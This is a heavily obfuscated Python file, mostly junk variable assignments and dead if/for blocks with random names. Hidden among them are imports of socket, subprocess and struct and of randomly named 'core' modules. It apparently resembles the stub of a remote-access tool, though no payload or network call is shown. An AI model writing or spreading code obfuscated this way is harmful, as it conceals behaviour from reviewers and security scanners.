#!/usr/bin/env python

eBgczdUFyvYcwLZDMWrXZIxQdfmGTDJM = 'WCyZQgjfglxUekaNgvgSgLqgYYLoJwKn'
SLkPQVctoAAPNpDPHusTmowELCQmBnCD = 'zwNNLliaVAtSHSYvKMSQFWnAgngNRSik'
evdJIWCkcQfjyzVGdbrGxmAMhzbPvdSS = 'jeRIytdlfNQtPoIuZZUoqEczbZBwkxTh'
if eBgczdUFyvYcwLZDMWrXZIxQdfmGTDJM == SLkPQVctoAAPNpDPHusTmowELCQmBnCD:
    evdJIWCkcQfjyzVGdbrGxmAMhzbPvdSS = 'jeRIytdlfNQtPoIuZZUoqEczbZBwkxTh'
    evdJIWCkcQfjyzVGdbrGxmAMhzbPvdSS = eBgczdUFyvYcwLZDMWrXZIxQdfmGTDJM
else:
    evdJIWCkcQfjyzVGdbrGxmAMhzbPvdSS = 'jeRIytdlfNQtPoIuZZUoqEczbZBwkxTh'
    evdJIWCkcQfjyzVGdbrGxmAMhzbPvdSS = 'WCyZQgjfglxUekaNgvgSgLqgYYLoJwKn'
# -*- coding: utf-8 -*-

RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe = 'IXtKyqToVbsHnERiPPbwBpzQaKvbKlQO'
vPYmslLJdpJxZKlyDikwEgmMUONigqbh = 'lUoSqCWRoGaUIQCvtroNApuVTvYRUcnW'
iOzgtwfXkGLucXSVjavLYYusIPpJybnx = 'EzvSAMtBhMlyOxsdUVqXMwtVJUtKmDim'
kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP = 'CrvyiJQlYMNeeSPXnFhehajcDrQdVlZT'
if vPYmslLJdpJxZKlyDikwEgmMUONigqbh == RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe:
    for RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe in vPYmslLJdpJxZKlyDikwEgmMUONigqbh:
        if vPYmslLJdpJxZKlyDikwEgmMUONigqbh == vPYmslLJdpJxZKlyDikwEgmMUONigqbh:
            iOzgtwfXkGLucXSVjavLYYusIPpJybnx = 'kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP'
        elif iOzgtwfXkGLucXSVjavLYYusIPpJybnx == kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP:
            kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP = RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe
        else:
            RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe = vPYmslLJdpJxZKlyDikwEgmMUONigqbh
elif iOzgtwfXkGLucXSVjavLYYusIPpJybnx == iOzgtwfXkGLucXSVjavLYYusIPpJybnx:
    for iOzgtwfXkGLucXSVjavLYYusIPpJybnx in vPYmslLJdpJxZKlyDikwEgmMUONigqbh:
        if kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP == vPYmslLJdpJxZKlyDikwEgmMUONigqbh:
            iOzgtwfXkGLucXSVjavLYYusIPpJybnx = 'kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP'
        elif iOzgtwfXkGLucXSVjavLYYusIPpJybnx == kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP:
            kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP = RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe
        else:
            RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe = vPYmslLJdpJxZKlyDikwEgmMUONigqbh
            for iOzgtwfXkGLucXSVjavLYYusIPpJybnx in vPYmslLJdpJxZKlyDikwEgmMUONigqbh:
                if kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP == vPYmslLJdpJxZKlyDikwEgmMUONigqbh:
                    iOzgtwfXkGLucXSVjavLYYusIPpJybnx = 'kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP'
                elif iOzgtwfXkGLucXSVjavLYYusIPpJybnx == kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP:
                    kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP = RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe
                else:
                    RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe = kMLAtTUunSiPYaVyCxabLhnYSlVhMvGP
else:
    RTRPdPZfPwjWfzxWjNuvFOfsFbicDoAe = vPYmslLJdpJxZKlyDikwEgmMUONigqbh
import socket

WKMCaOZKSZOMgYFQViMfyeCHhCdAwSMh = 'iyOpiIJVQEmqQEDGuzFNUhJGOzazAnub'
oKmFOThlLCPCfDPmDNvtPnXNmdRwFnDi = 'YBLWNnOWxRefxEuYjwYnyjYKIcMrSIUL'
cuoJfBWGEvIlcligTqmXieKIPxTuEYSL = 'QwpfaYEfFTdLtcbeMEWiBucucjSIzGWM'
REfeDYoNkvCoBSOXxbbRlycnGyQESHPw = 'pbZtlfkcxSYsaDhsFVwgwfbxxEhGGVhC'
UtJueWQTDPesVpagoArEpoYKMgNZgHOR = 'swwNTpjlOcHtVgDJttFVMsjyIehSHCCz'
SVDSjfiJjPYkEpKWspXAPehtGjQtShLD = 'sGSEKRaQyvlloSiHtGIpaROXMeJfLqbg'
if WKMCaOZKSZOMgYFQViMfyeCHhCdAwSMh != REfeDYoNkvCoBSOXxbbRlycnGyQESHPw:
    oKmFOThlLCPCfDPmDNvtPnXNmdRwFnDi = cuoJfBWGEvIlcligTqmXieKIPxTuEYSL
    for SVDSjfiJjPYkEpKWspXAPehtGjQtShLD in REfeDYoNkvCoBSOXxbbRlycnGyQESHPw:
        if SVDSjfiJjPYkEpKWspXAPehtGjQtShLD != cuoJfBWGEvIlcligTqmXieKIPxTuEYSL:
            oKmFOThlLCPCfDPmDNvtPnXNmdRwFnDi = oKmFOThlLCPCfDPmDNvtPnXNmdRwFnDi
        else:
            UtJueWQTDPesVpagoArEpoYKMgNZgHOR = WKMCaOZKSZOMgYFQViMfyeCHhCdAwSMh
else:
    cuoJfBWGEvIlcligTqmXieKIPxTuEYSL = WKMCaOZKSZOMgYFQViMfyeCHhCdAwSMh
    WKMCaOZKSZOMgYFQViMfyeCHhCdAwSMh = UtJueWQTDPesVpagoArEpoYKMgNZgHOR
    if cuoJfBWGEvIlcligTqmXieKIPxTuEYSL == WKMCaOZKSZOMgYFQViMfyeCHhCdAwSMh:
        for SVDSjfiJjPYkEpKWspXAPehtGjQtShLD in WKMCaOZKSZOMgYFQViMfyeCHhCdAwSMh:
            if SVDSjfiJjPYkEpKWspXAPehtGjQtShLD == cuoJfBWGEvIlcligTqmXieKIPxTuEYSL:
                cuoJfBWGEvIlcligTqmXieKIPxTuEYSL = WKMCaOZKSZOMgYFQViMfyeCHhCdAwSMh
            else:
                cuoJfBWGEvIlcligTqmXieKIPxTuEYSL = UtJueWQTDPesVpagoArEpoYKMgNZgHOR
import subprocess

lCJWQzlXYasqmVgnDdvczMrszCzdRicW = 'PtbiekMbVYIOEHzDaDQwVoJVCSznkGlI'
oUCJYYhSnrsRhzEDNZzqmSePxliqEVTG = 'FQPWVOsoGVISizjTpUUpkWxXaFROdKXL'
SxsrPfQhooEzrpBklvzwdmswWYmZSQsB = 'qPHzFbTOVTyTEuUiGeUUdIVAliMOcydZ'
fLCSVkiGbfXKwTazHaMItUeNjjyIhjDN = 'QPQvrmzCawslmvLODfBZIpDLqTdYeThh'
lfjoiQMRyXOuKDZPYxGGqSvLpFgiFgSb = 'igLmWxHOGutMuDqPlrDJGFCgoTdylOwH'
if lCJWQzlXYasqmVgnDdvczMrszCzdRicW in oUCJYYhSnrsRhzEDNZzqmSePxliqEVTG:
    lCJWQzlXYasqmVgnDdvczMrszCzdRicW = lfjoiQMRyXOuKDZPYxGGqSvLpFgiFgSb
    if oUCJYYhSnrsRhzEDNZzqmSePxliqEVTG in SxsrPfQhooEzrpBklvzwdmswWYmZSQsB:
        oUCJYYhSnrsRhzEDNZzqmSePxliqEVTG = fLCSVkiGbfXKwTazHaMItUeNjjyIhjDN
elif oUCJYYhSnrsRhzEDNZzqmSePxliqEVTG in lCJWQzlXYasqmVgnDdvczMrszCzdRicW:
    SxsrPfQhooEzrpBklvzwdmswWYmZSQsB = oUCJYYhSnrsRhzEDNZzqmSePxliqEVTG
    if SxsrPfQhooEzrpBklvzwdmswWYmZSQsB in oUCJYYhSnrsRhzEDNZzqmSePxliqEVTG:
        oUCJYYhSnrsRhzEDNZzqmSePxliqEVTG = lfjoiQMRyXOuKDZPYxGGqSvLpFgiFgSb
import struct

PVVgRYmLggoAvKacrFSbKWbeTvTpYgQV = 'YEUfeLwjhwgKLSEONymAbZVFOGTaSPrg'
YSnzYsLJnlpDkLgcFHyCPgcryDoIKekq = 'sBmgjogVfsUufmYJPkbTseTBdWJHiIKq'
PtlcdtfcHWKjUFDxWBzTCHFqFDiTTXnL = 'YPFcVdgUpmGKricZEcijDkijBCyRdMHE'
VgKaZilAtnZgQlxpzcHAUZDJHrJfczHO = 'JjfwSyocAORrvazkaKCOyrwSvvMCNrue'
sEjLBsDucFURhoqghEVweIGEMQhUGOEg = 'AZWDXNFJKrTZxrsKIrdMcQyYmvScKQel'
ZxzWJGagLXNcudeqQwfcJHGEoXgBpwxS = 'WQZDEtuQtPGjEWgVUUvNNVjCpzWAkIUK'
if PVVgRYmLggoAvKacrFSbKWbeTvTpYgQV != VgKaZilAtnZgQlxpzcHAUZDJHrJfczHO:
    YSnzYsLJnlpDkLgcFHyCPgcryDoIKekq = PtlcdtfcHWKjUFDxWBzTCHFqFDiTTXnL
    for ZxzWJGagLXNcudeqQwfcJHGEoXgBpwxS in VgKaZilAtnZgQlxpzcHAUZDJHrJfczHO:
        if ZxzWJGagLXNcudeqQwfcJHGEoXgBpwxS != PtlcdtfcHWKjUFDxWBzTCHFqFDiTTXnL:
            YSnzYsLJnlpDkLgcFHyCPgcryDoIKekq = YSnzYsLJnlpDkLgcFHyCPgcryDoIKekq
        else:
            sEjLBsDucFURhoqghEVweIGEMQhUGOEg = PVVgRYmLggoAvKacrFSbKWbeTvTpYgQV
else:
    PtlcdtfcHWKjUFDxWBzTCHFqFDiTTXnL = PVVgRYmLggoAvKacrFSbKWbeTvTpYgQV
    PVVgRYmLggoAvKacrFSbKWbeTvTpYgQV = sEjLBsDucFURhoqghEVweIGEMQhUGOEg
    if PtlcdtfcHWKjUFDxWBzTCHFqFDiTTXnL == PVVgRYmLggoAvKacrFSbKWbeTvTpYgQV:
        for ZxzWJGagLXNcudeqQwfcJHGEoXgBpwxS in PVVgRYmLggoAvKacrFSbKWbeTvTpYgQV:
            if ZxzWJGagLXNcudeqQwfcJHGEoXgBpwxS == PtlcdtfcHWKjUFDxWBzTCHFqFDiTTXnL:
                PtlcdtfcHWKjUFDxWBzTCHFqFDiTTXnL = PVVgRYmLggoAvKacrFSbKWbeTvTpYgQV
            else:
                PtlcdtfcHWKjUFDxWBzTCHFqFDiTTXnL = sEjLBsDucFURhoqghEVweIGEMQhUGOEg
import sys

WfCZCSYIfcFftVKwsnPxBDqzhYDPLwKJ = 'lmVpPduggXIkYZnnRssOICGyNErdnGHR'
APygHFApLInfHBGukHZPLnIdfQEPVtHg = 'eTFVzqAJBeZmkdKLfUYTAkOanwXdnbqH'
fDklVUIPePnHYvexfxoxJpKFLlQFJreJ = 'OvhPSMdWTcIMRUIJjutqXBpEFxZkzkaG'
lJIZFzAVPFDUxgMSuqzniZMBtBaIsowr = 'VAMKNzraGJTgSAySKxkfWPPPibMvKGiS'
rmGguqBjLLIFvalSZTXUgrbOjRyKxNlb = 'jPTziwSnWkhGkARCyEJcUYqfiCbeDHCo'
KKPsucnSqiJCPocWcQrFMpMXYSHxZnyy = 'iakietYfwSciBNMEPAiBWSniyyZpZBHf'
if WfCZCSYIfcFftVKwsnPxBDqzhYDPLwKJ != lJIZFzAVPFDUxgMSuqzniZMBtBaIsowr:
    APygHFApLInfHBGukHZPLnIdfQEPVtHg = fDklVUIPePnHYvexfxoxJpKFLlQFJreJ
    for KKPsucnSqiJCPocWcQrFMpMXYSHxZnyy in lJIZFzAVPFDUxgMSuqzniZMBtBaIsowr:
        if KKPsucnSqiJCPocWcQrFMpMXYSHxZnyy != fDklVUIPePnHYvexfxoxJpKFLlQFJreJ:
            APygHFApLInfHBGukHZPLnIdfQEPVtHg = APygHFApLInfHBGukHZPLnIdfQEPVtHg
        else:
            rmGguqBjLLIFvalSZTXUgrbOjRyKxNlb = WfCZCSYIfcFftVKwsnPxBDqzhYDPLwKJ
else:
    fDklVUIPePnHYvexfxoxJpKFLlQFJreJ = WfCZCSYIfcFftVKwsnPxBDqzhYDPLwKJ
    WfCZCSYIfcFftVKwsnPxBDqzhYDPLwKJ = rmGguqBjLLIFvalSZTXUgrbOjRyKxNlb
    if fDklVUIPePnHYvexfxoxJpKFLlQFJreJ == WfCZCSYIfcFftVKwsnPxBDqzhYDPLwKJ:
        for KKPsucnSqiJCPocWcQrFMpMXYSHxZnyy in WfCZCSYIfcFftVKwsnPxBDqzhYDPLwKJ:
            if KKPsucnSqiJCPocWcQrFMpMXYSHxZnyy == fDklVUIPePnHYvexfxoxJpKFLlQFJreJ:
                fDklVUIPePnHYvexfxoxJpKFLlQFJreJ = WfCZCSYIfcFftVKwsnPxBDqzhYDPLwKJ
            else:
                fDklVUIPePnHYvexfxoxJpKFLlQFJreJ = rmGguqBjLLIFvalSZTXUgrbOjRyKxNlb
try:

    iKcHiJigEGMFdquhomgGsyKsLASDCpOd = 'zddEyyLrCwWEmtVarMAATtqpcOkStFVn'
    ZcistqVWjpSFYTtSPutfPTCDFKixzbbU = 'UPoGNNZZrbMqRTqJEOQGvJRTcalurCey'
    MaMAgwbCEGmOelCcUbFpaDUiTXvkhLyV = 'kKpHaorvkKHZfMvGlZMWIrkedmhXHLXT'
    if iKcHiJigEGMFdquhomgGsyKsLASDCpOd == ZcistqVWjpSFYTtSPutfPTCDFKixzbbU:
        MaMAgwbCEGmOelCcUbFpaDUiTXvkhLyV = 'kKpHaorvkKHZfMvGlZMWIrkedmhXHLXT'
        MaMAgwbCEGmOelCcUbFpaDUiTXvkhLyV = iKcHiJigEGMFdquhomgGsyKsLASDCpOd
    else:
        MaMAgwbCEGmOelCcUbFpaDUiTXvkhLyV = 'kKpHaorvkKHZfMvGlZMWIrkedmhXHLXT'
        MaMAgwbCEGmOelCcUbFpaDUiTXvkhLyV = 'zddEyyLrCwWEmtVarMAATtqpcOkStFVn'
    from core.nRCQFariepVHzPRgWueSCcSNIpMrGeVq import VZGbVmtqTmDOEQHhKIeKvmdxXyGUEXLA, PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib, oNZYiYHmYKBhkOiCodDdHRZcATGFPzLg

    waIzSpIVFtYvrgbAUwxfvlBNafYMCqeJ = 'DZStJgqsOoKSvLpmiTRQSkbjXFNpBSCZ'
    qIzAaGBuBRNxgTheLYiYYHgEyZQKKBcD = 'WmCBWnXdNgkKOXCCiHhAIJhQzZZRuxOe'
    IvRAcvcswsCCFOKlUaBfwwHhJWaliKzu = 'VPHrnCliRXBICuHdrJqmwDFfWOuOIckF'
    SVqkVfEKzDSbZgidSXWOBWVIqOSkzmlY = 'jyBCpkjZRxsGBbJoAZbGSQBEAHrDZLen'
    oeCGEBhkdDfrZOLPmOTBSUAafDSdPLvc = 'fAPRpPXfbnLssrAuEbAJSZWxrunIVbNT'
    LOBHesUYjMYYpluzuGYoWSpncVAcrunR = 'iYxHqmoPZSEUOWKhwkAvYDBDsSQckOIY'
    if waIzSpIVFtYvrgbAUwxfvlBNafYMCqeJ != SVqkVfEKzDSbZgidSXWOBWVIqOSkzmlY:
        qIzAaGBuBRNxgTheLYiYYHgEyZQKKBcD = IvRAcvcswsCCFOKlUaBfwwHhJWaliKzu
        for LOBHesUYjMYYpluzuGYoWSpncVAcrunR in SVqkVfEKzDSbZgidSXWOBWVIqOSkzmlY:
            if LOBHesUYjMYYpluzuGYoWSpncVAcrunR != IvRAcvcswsCCFOKlUaBfwwHhJWaliKzu:
                qIzAaGBuBRNxgTheLYiYYHgEyZQKKBcD = qIzAaGBuBRNxgTheLYiYYHgEyZQKKBcD
            else:
                oeCGEBhkdDfrZOLPmOTBSUAafDSdPLvc = waIzSpIVFtYvrgbAUwxfvlBNafYMCqeJ
    else:
        IvRAcvcswsCCFOKlUaBfwwHhJWaliKzu = waIzSpIVFtYvrgbAUwxfvlBNafYMCqeJ
        waIzSpIVFtYvrgbAUwxfvlBNafYMCqeJ = oeCGEBhkdDfrZOLPmOTBSUAafDSdPLvc
        if IvRAcvcswsCCFOKlUaBfwwHhJWaliKzu == waIzSpIVFtYvrgbAUwxfvlBNafYMCqeJ:
            for LOBHesUYjMYYpluzuGYoWSpncVAcrunR in waIzSpIVFtYvrgbAUwxfvlBNafYMCqeJ:
                if LOBHesUYjMYYpluzuGYoWSpncVAcrunR == IvRAcvcswsCCFOKlUaBfwwHhJWaliKzu:
                    IvRAcvcswsCCFOKlUaBfwwHhJWaliKzu = waIzSpIVFtYvrgbAUwxfvlBNafYMCqeJ
                else:
                    IvRAcvcswsCCFOKlUaBfwwHhJWaliKzu = oeCGEBhkdDfrZOLPmOTBSUAafDSdPLvc
    from core.WrdYkeIxHpEWpYCxWFPSghInPCcPGYMM import UKljRqYmyRjdhxzdwCmbaZADNXeYjPzg, ehRKSVQWUJyNRXJlOKfRDOvOWCanPXzl

    VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq = 'RrTFBoekprkIREZWSCdPAhoLEfXACoMS'
    wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX = 'upRAsLyeeAfmpAwqxSBiBQFGmjqUTZbo'
    xciepULLCtIcYVczNhtrKxizEFvKXKQg = 'RwBepUkDUrKkdPSPpDjSKPixEyjTgtmp'
    vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz = 'VGHkQjPVUIOXyNldHJJBRtyrbiPVOBKi'
    if wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX == VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq:
        for VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq in wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX:
            if wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX == wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX:
                xciepULLCtIcYVczNhtrKxizEFvKXKQg = 'vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz'
            elif xciepULLCtIcYVczNhtrKxizEFvKXKQg == vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz:
                vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz = VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq
            else:
                VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq = wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX
    elif xciepULLCtIcYVczNhtrKxizEFvKXKQg == xciepULLCtIcYVczNhtrKxizEFvKXKQg:
        for xciepULLCtIcYVczNhtrKxizEFvKXKQg in wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX:
            if vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz == wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX:
                xciepULLCtIcYVczNhtrKxizEFvKXKQg = 'vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz'
            elif xciepULLCtIcYVczNhtrKxizEFvKXKQg == vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz:
                vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz = VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq
            else:
                VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq = wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX
                for xciepULLCtIcYVczNhtrKxizEFvKXKQg in wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX:
                    if vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz == wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX:
                        xciepULLCtIcYVczNhtrKxizEFvKXKQg = 'vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz'
                    elif xciepULLCtIcYVczNhtrKxizEFvKXKQg == vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz:
                        vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz = VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq
                    else:
                        VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq = vMAUWHWIFXiwgFYxlbyGqbocQxWFfIhz
    else:
        VEtEBgXXsxRFFkpHezgESFdQRSYYvPQq = wIyQWTfWIAyySYGSHcYhXAQCVJqbbraX
    from core.QeGwcMKWsVCJkXvkjAQshHFtGrZhGAwc import CjVxWcOTrRVtfhmLQPYezPvfvjIoelab

    try:
        uycNgPWXNoiXskVJaRZtmZdTyGcAwkwA = 'tTsDhMKfyFmDPCSvKsCvIFZvUEGJVRTI'
        hVIkhgeSLXLNPLUpayhlnBaQosOnFkNu = 'IpzuBiImYLMFVAqtTQFtVWxqTuzrXNMO'
        sfJqZacjoDNswiyoKzmjznkeADDsLVgk = 'ZKKsHirYtwFsFIPadxjrdzfACrTMFPNy'
        ihgKhRiijWCNqlbeQeWbYAMeXCKFPYPT = 'ijaUytUYSDnpdWfFLxIvZPPTbTxcitWi'
        buRbthlNzOuWysYoYgGBQFjyBZSQAmpk = 'TpkusPzzHfQrOOwnGyLdVtLGRsWVfnLi'
        qUsExtMPqxebjjDdVuvGsYPiKDquvfBc = 'GqKaXiblPRBynlfUFyzgHtMHDqDjwhUx'
        ueVgptpSbQzrVAWHTtkIwdWizGgLHHHM = [
                'tTsDhMKfyFmDPCSvKsCvIFZvUEGJVRTI',
                'ZKKsHirYtwFsFIPadxjrdzfACrTMFPNy',
                'TpkusPzzHfQrOOwnGyLdVtLGRsWVfnLi',
                'oYTYuxEwHZHRAVszwAhqGpTdOOctcgxF'
        ]
        for uycNgPWXNoiXskVJaRZtmZdTyGcAwkwA in qUsExtMPqxebjjDdVuvGsYPiKDquvfBc:
            for hVIkhgeSLXLNPLUpayhlnBaQosOnFkNu in sfJqZacjoDNswiyoKzmjznkeADDsLVgk:
                if ihgKhRiijWCNqlbeQeWbYAMeXCKFPYPT == buRbthlNzOuWysYoYgGBQFjyBZSQAmpk:
                    hVIkhgeSLXLNPLUpayhlnBaQosOnFkNu = uycNgPWXNoiXskVJaRZtmZdTyGcAwkwA
                elif buRbthlNzOuWysYoYgGBQFjyBZSQAmpk == hVIkhgeSLXLNPLUpayhlnBaQosOnFkNu:
                    hVIkhgeSLXLNPLUpayhlnBaQosOnFkNu = qUsExtMPqxebjjDdVuvGsYPiKDquvfBc
                else:
                    buRbthlNzOuWysYoYgGBQFjyBZSQAmpk = qUsExtMPqxebjjDdVuvGsYPiKDquvfBc
                    for hVIkhgeSLXLNPLUpayhlnBaQosOnFkNu in ueVgptpSbQzrVAWHTtkIwdWizGgLHHHM:
                        sfJqZacjoDNswiyoKzmjznkeADDsLVgk = hVIkhgeSLXLNPLUpayhlnBaQosOnFkNu
    except Exception:
        pass
    from core.ZVXZbXwJqYOXeoXkVDNNLZULcJLDKTYt import RIIkeigBsFnPYhEAbeKPinkIHRCmtEsM

    try:
        vUCPwwOqxvhKcVWVSmHGSLOgucAVEjeG = 'cGMSSNkMGHJzqixLCysFYWUsdLnpYdGd'
        XGasodatDXofYjOlsKcKPVnzKhrdBNNM = 'NAXdYYPKiaXQJaBgkpVIXaHeWFICtBqI'
        cBqFSyTnEzWCFBmgodhHLenBqzxqWEZs = 'qmCJpxrhoraSnGqzchPxfyfcYUKjdTlQ'
        eeZkwlrtQJpERlEcDOjsnxqkEmTpYOxo = 'DaieKIgKMFACuCAEpFzJjlcSKJDfmNzO'
        NTNbnVgSSVLKFvCqmqhimEyqYcjkmWRH = 'ffCsTWISKyTDQmpzAGvqdadXVIpmkGNU'
        hTDMkYhhBtCxiZYGGmGNRfXrtuEbgiwC = 'pCrVcdXCwmtrMbZXWHBVUbSqidwcggXs'
        zwGtCLJJttMeIUYKlIAZKaJWrskdcdIy = [
                'cGMSSNkMGHJzqixLCysFYWUsdLnpYdGd',
                'qmCJpxrhoraSnGqzchPxfyfcYUKjdTlQ',
                'ffCsTWISKyTDQmpzAGvqdadXVIpmkGNU',
                'UfmUyTLfknlXyeVdfxHcdiHqEDFYHNZM'
        ]
        for vUCPwwOqxvhKcVWVSmHGSLOgucAVEjeG in hTDMkYhhBtCxiZYGGmGNRfXrtuEbgiwC:
            for XGasodatDXofYjOlsKcKPVnzKhrdBNNM in cBqFSyTnEzWCFBmgodhHLenBqzxqWEZs:
                if eeZkwlrtQJpERlEcDOjsnxqkEmTpYOxo == NTNbnVgSSVLKFvCqmqhimEyqYcjkmWRH:
                    XGasodatDXofYjOlsKcKPVnzKhrdBNNM = vUCPwwOqxvhKcVWVSmHGSLOgucAVEjeG
                elif NTNbnVgSSVLKFvCqmqhimEyqYcjkmWRH == XGasodatDXofYjOlsKcKPVnzKhrdBNNM:
                    XGasodatDXofYjOlsKcKPVnzKhrdBNNM = hTDMkYhhBtCxiZYGGmGNRfXrtuEbgiwC
                else:
                    NTNbnVgSSVLKFvCqmqhimEyqYcjkmWRH = hTDMkYhhBtCxiZYGGmGNRfXrtuEbgiwC
                    for XGasodatDXofYjOlsKcKPVnzKhrdBNNM in zwGtCLJJttMeIUYKlIAZKaJWrskdcdIy:
                        cBqFSyTnEzWCFBmgodhHLenBqzxqWEZs = XGasodatDXofYjOlsKcKPVnzKhrdBNNM
    except Exception:
        pass
    from core.FfRdnqlwquMgpFgUBololWBzOwZRspOG import CjVxWcOTrRVtfhmLQPYezPvfvjIoelab

    JJxhmZrorUpkNyABJaivkLqRiVhHDaXr = 'kQvzSBhhKkuCYNaSkROvQECLTvoJherP'
    icsqYDNblbWexCHRxUTLfPuiERhVdQEL = 'pWkTXHHgSxPUMslsVbmbwbAlVUEgzYtU'
    if JJxhmZrorUpkNyABJaivkLqRiVhHDaXr != icsqYDNblbWexCHRxUTLfPuiERhVdQEL:
        JJxhmZrorUpkNyABJaivkLqRiVhHDaXr = 'pWkTXHHgSxPUMslsVbmbwbAlVUEgzYtU'
        icsqYDNblbWexCHRxUTLfPuiERhVdQEL = JJxhmZrorUpkNyABJaivkLqRiVhHDaXr
        JJxhmZrorUpkNyABJaivkLqRiVhHDaXr = 'kQvzSBhhKkuCYNaSkROvQECLTvoJherP'
    from core.JODRNAOaZCmhHuVOkVVUoJatinIPHxKP import toaJpGhohWQJmFciVMtksgdjtmmLxJpZ, CQmHLKeKQtmgAuCbLeIUyFRKkwLrKOHO

    OTclrEivgSGZXNEqTYRWCuXoRWHKOCUJ = 'DKYqYVzbfBcapChFauxTTFvzkwHAqwan'
    UGjuuAjyQuWTlmuGeJArZgaiNqbHrykq = 'DEESXXcvDgtaqGoOtuUNfyasyecPPPdG'
    UUXiPWArsCaTrWJcxJdpaSBOiRjLrIkY = 'RUIHhzQqVmQweTrHLsQSxvagBgSNHRag'
    dHxqdHdvHVEOYlmbGeqNfEJWpWvvytpX = 'jakaeZCbQCbvMBmyzIjjOdRpkQcRhlse'
    aBPrOMaOfoMVpoLCAKFAkSSkqAQcMDre = 'npYszYsHIAnAWAEDSgJadVogWhFgcskh'
    if OTclrEivgSGZXNEqTYRWCuXoRWHKOCUJ in UGjuuAjyQuWTlmuGeJArZgaiNqbHrykq:
        OTclrEivgSGZXNEqTYRWCuXoRWHKOCUJ = aBPrOMaOfoMVpoLCAKFAkSSkqAQcMDre
        if UGjuuAjyQuWTlmuGeJArZgaiNqbHrykq in UUXiPWArsCaTrWJcxJdpaSBOiRjLrIkY:
            UGjuuAjyQuWTlmuGeJArZgaiNqbHrykq = dHxqdHdvHVEOYlmbGeqNfEJWpWvvytpX
    elif UGjuuAjyQuWTlmuGeJArZgaiNqbHrykq in OTclrEivgSGZXNEqTYRWCuXoRWHKOCUJ:
        UUXiPWArsCaTrWJcxJdpaSBOiRjLrIkY = UGjuuAjyQuWTlmuGeJArZgaiNqbHrykq
        if UUXiPWArsCaTrWJcxJdpaSBOiRjLrIkY in UGjuuAjyQuWTlmuGeJArZgaiNqbHrykq:
            UGjuuAjyQuWTlmuGeJArZgaiNqbHrykq = aBPrOMaOfoMVpoLCAKFAkSSkqAQcMDre
except ImportError as HyuxhUTajPpKCWhRkLKqqZJEgSPOedLe:

    FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU = 'PxTjbRtIObFvVgcBvukANUALOwesxzip'
    BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg = 'eCnvjFKBRUSPKsCPSRYsZocHxJeUIWmk'
    BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL = 'DltSPQDQnWtryszlbtHZBFwCJaxRpxbi'
    cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU = 'HzFzvNCixeMBjvatNPNnSvDcSKANXAnV'
    if BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg == FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU:
        for FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU in BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg:
            if BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg == BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg:
                BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL = 'cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU'
            elif BMihFrrbDCjNIJIAjwVEuzVKQCNMjIyL == cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU:
                cXuFtSDLVdiXDwVbOHKvXmADHnfWgxPU = FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU
            else:
                FxfNFjPTgSUXTXTUvdjZdIZlcvbtZYeU = BUaPvHHckzlKKkBQZzwGXsGpnwAiOqpg
